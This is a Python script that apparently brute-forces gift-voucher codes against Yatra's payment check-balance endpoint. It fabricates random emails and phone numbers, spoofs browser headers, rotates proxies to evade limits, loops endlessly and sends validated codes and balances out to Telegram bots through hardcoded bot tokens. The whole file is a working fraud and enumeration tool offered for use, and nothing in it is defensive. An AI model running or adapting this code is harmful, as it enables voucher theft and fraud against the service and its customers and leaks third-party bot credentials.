import random
import requests
import json
import time


def generate_code():
    """Generate a random code in the exact format Y2GTV?m?m?m?m?m?m?m?m?m?m."""
    base = "Y2GTV"
    suffix = ''.join(
        random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
    return "Y2GTVY8X0D7C5EY" #base + suffix


def generate_email():
    """Generate a random email address."""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    username = ''.join(
        random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
    return f"{username}@{random.choice(domains)}"


def generate_phone():
    """Generate a random 10-digit Indian phone number."""
    return f"9{random.randint(100000000, 999999999)}"


def make_post_request(code, email, phone, proxy):
    """Make a POST request to the Yatra API with the generated code using a proxy."""
    url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"

    # Custom headers
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://secure.yatra.com",
        "referer": "https://secure.yatra.com/PaySwift/payment",
        "sec-ch-ua": '"-Not.A/Brand";v="8", "Chromium";v="102"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }

    # Payload
    payload = {
        "superPnr": "1611240003969",
        "emailId": email,
        "amount": 13191,
        "lob": "AIR",
        "isd": "91",
        "mobile": phone,
        "source": "YT",
        "context": "REVIEW",
        "vouchers": [{
            "code": code,
            "type": "PROMO",
            "pin": ""
        }]
    }

    # Proxy configuration
    proxies = {"http": f"http://{proxy}"}

    try:
        response = requests.post(url,
                                 headers=headers,
                                 json=payload,
                                 proxies=proxies,
                                 timeout=10)
        response.raise_for_status()  # Raise HTTPError for bad responses
        return response.json()
    except requests.RequestException as e:
        print(f"Error during request with proxy {proxy}: {e}")
        return None


def send_to_telegram(api_url, message):
    """Send a message to Telegram using the specified API."""
    telegram_url = f"{api_url}&text={message}"
    try:
        response = requests.get(telegram_url)
        response.raise_for_status()
        print(f"Notification sent to Telegram: {message}")
    except requests.RequestException as e:
        print(f"Error sending notification to Telegram: {e}")


def get_proxies(file_path):
    """Return a list of proxies read from the specified file."""
    proxies = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                proxy = line.strip()  # Remove any extra spaces or newlines
                if proxy:  # Ignore empty lines
                    proxies.append(proxy)
        if not proxies:
            print("Warning: No proxies found in the file.")
    except FileNotFoundError:
        print(f"Error: The file {file_path} does not exist.")
    except Exception as e:
        print(f"Error reading the proxy file: {e}")
    return proxies


def main():
    """Generate and validate voucher codes continuously."""
    valid_code_api = "https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246"
    invalid_code_api = "https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395"

    proxies_file_path = "proxies.txt"  # Path to the proxy list file
    proxies = get_proxies(proxies_file_path)

    if not proxies:
        print("Exiting, as no proxies were loaded.")
        return

    while True:
        code = generate_code()
        email = generate_email()
        phone = generate_phone()

        proxy = random.choice(proxies)  # Pick a random proxy for each request

        print(f"Generated code: {code}")
        print(f"Generated email: {email}")
        print(f"Generated phone: {phone}")
        print(f"Using proxy: {proxy}")

        response = make_post_request(code, email, phone, proxy)

        if response:
            print(f"API Response: {json.dumps(response, indent=2)}")
            if response.get("resMsg") == "Successfully validated":
                redeemed_balance = response["vouchers"][0]["redeemedBalance"]
                total_balance = response["vouchers"][0]["totalBalance"]

                message = (f"Code validated successfully:\n"
                           f"Code: {code}\n"
                           f"Redeemed Balance: {redeemed_balance}\n"
                           f"Total Balance: {total_balance}")
                print(message)
                send_to_telegram(valid_code_api, message)
            else:
                error_message = (
                    f"Validation failed for code: {code}. Response message: {response.get('resMsg', 'Unknown error')}."
                )
                print(error_message)
                send_to_telegram(invalid_code_api, error_message)
        else:
            print(f"No valid response received or request failed with proxy {proxy}.")
            send_to_telegram(invalid_code_api, "Request failed, no valid response.")

        time.sleep(20)  # Delay between iterations to avoid excessive load


if __name__ == "__main__":
    main()
